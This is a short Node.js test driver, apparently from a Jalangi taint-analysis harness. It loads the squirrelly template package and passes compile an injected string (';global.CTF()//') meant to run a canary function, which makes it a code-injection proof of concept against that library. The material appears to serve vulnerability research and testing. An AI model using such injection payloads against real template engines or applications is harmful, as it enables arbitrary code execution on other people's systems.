// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/squirrelly/node_modules/squirrelly');
global.CTF = function() {console.log("GLOBAL.CTF HIT")}
try {
	var x0 = "^7";
var x1 = ";global.CTF()//";
new PUT["compile"](x0,x1)();
} catch (e) {
	console.log(e);
}